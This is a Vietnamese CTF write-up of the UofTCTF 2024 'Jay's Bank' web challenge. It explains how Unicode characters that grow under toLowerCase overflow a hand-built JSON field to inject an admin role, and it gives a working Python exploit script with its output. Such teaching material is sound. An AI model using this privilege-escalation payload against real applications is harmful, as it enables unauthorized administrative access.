---
title: "UofTCTF 2024"
layout: single
excerpt: "January 13, 2024 12:00 PM EST to January 14, 2024 11:59 PM EST 💻 "
header:
show_date: true
classes: wide
header:
  teaser: "https://hackmd.io/_uploads/BkpzSDDYT.png"
  teaser_home_page: true
  icon: "https://hackmd.io/_uploads/By3gJwG0h.png"
categories:
  - CTF
tags:
  - CTF
  - Vietnamese
---

<p align="center">
<img src="https://hackmd.io/_uploads/BkpzSDDYT.png">
</p>


# WEB challs
## Jay's Bank - 499 point

### Description
```
My bank is still in pre-alpha-alpha-alpha stage, but I'm sure it's secure enough to keep all of your information safe.

Author: SteakEnthusiast

http://34.123.200.191/

```

source code [here](https://github.com/TaiPhung217/CTF_writeup/blob/main/2024/uofTCTF2024/jays-bank.zip)

### Solution

Giao diện trang web cung cấp như sau: 

![Alt text](https://hackmd.io/_uploads/HkFS1vDFp.png)

Vì challenge này cung cấp source code nên ta sẽ thực hiện review source trước.

Trong `CTF/uoftctf/jays-bank/routes/index.js`
Đọc đoạn code sau có thể thấy để có thể lấy được FLAG ta cần một tài khoản với `role:admin` 

![Alt text](https://hackmd.io/_uploads/rJowkPwFa.png)

Nhưng mặc định, khi người dùng thực hiện update profile sẽ add thêm một `role:user`

![Alt text](https://hackmd.io/_uploads/SJmt1DPFp.png)

Kiểm tra trong database

![Alt text](https://hackmd.io/_uploads/HyScywvYp.png)

Phân tích một chút trong hàm `router.put("/profile", jwtAuth, async (req, res)` trong index.js
Lỗ hổng trong thử thách này xuất phát từ vị trí này 

![Alt text](https://hackmd.io/_uploads/H1_okPPY6.png)

app thực hiện lấy các thông tin `username, phone, credit_card, secret_question, secret_answer` và add thêm một `role:user`. Trong đó gọi tới hai hàm `updateData` để cập nhật data user vào database

![Alt text](https://hackmd.io/_uploads/Hyw31vDK6.png)

và hàm `convert` nhận vào một đối tượng (object) `o` và trả về một chuỗi JSON được tạo ra từ các cặp khóa-giá trị của đối tượng đó

```js
  convert(o) {
    return `{${Object.entries(o).map(([k, v]) => 
      `"${k}": ${typeof v === "object" && v !== null ? convert(v) : `"${v}"`}`
    ).join(", ")}}`.toLowerCase();
  }
```

Cuối cùng hàm thực hiện chuyển kết quả json về dạng LowerCase() trả về một khối `data` và update data này cho user trong database.

Trong file `init.sql` định nghĩa độ dài tối đa cho trường data này là `255`. 

![Alt text](https://hackmd.io/_uploads/r1F6kwDFp.png)

Ý tưởng khai thác:
- Các trường `secret_answer` và `role: "user"` được insert gần nhau, trong đó trường secret_answer có khả năng kiểm soát. Để khai thác thành công, chúng ta cần chèn một chuỗi secret_answer đủ dài vừa đủ để chèn được role mới và xóa bỏ role:user cũ , từ đó ghi đè lên một trường role khác với giá trị là `admin`.

- Trước đó, `secret_answer` và `secret_question` cũng phải vượt qua các điều kiện check sao cho không vượt quá 45 ký tự bằng cách sử dụng các ký tự Unicode đặc biệt như `İ` có thể làm tăng kích thước khi đi qua hàm `toLowerCase()`

```
Có một số ký tự đặc biệt trong JavaScript

Đối với toUpperCase():
Các ký tự “ı” và “ſ” được toUpperCase xử lý và kết quả là “I” và “S”

Đối với toLowerCase():
Ký tự “K” được toLowerCase xử lý và kết quả là “k” (K này không phải là K)
```

### Script
```python
import requests

url = "http://127.0.0.1:3000/"

session = requests.session()

session.post(url + 'register', json={"password": "Abc@123!@#", "username": "abc9092909078"})

session.post(url + 'login', json={"username":"abc9092909078","password":"Abc@123!@#"})

session.put(url + 'profile', json={"phone":"1234567890","credit_card":"1234567890987654","secret_question":"İİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİ","secret_answer":"İİİİİİİİİİİİİİİİİİİİİİİİ\",\"role\":\"admin\"}","current_password":"Abc@123!@#"})

res = session.get(url + 'dashboard')

print(res.text)
```

Result:
```
|_>kali: python 1.py

<!DOCTYPE html>
<html>
<head>
    <title>Dashboard - Jay's Bank</title>
    <link rel="stylesheet" href="/css/dashboard.css">
</head>
<body>
    <div class="container">
        <nav>
            <ul>
                <li><a href="/">Home</a></li>
                <li><a href="/profile">Edit Profile</a></li>
                <li><a href="/logout">Logout</a></li>
            </ul>
        </nav>
        <h1>Welcome, abc9092909078</h1>
        <p>Your phone number: 1234567890</p>
        <p>Your credit card (last 4 digits): 7654</p>
        
            <p>Since you're the admin, here is your flag: uoftctf{fake_flag}</p>
        
    </div>
</body>
</html>
```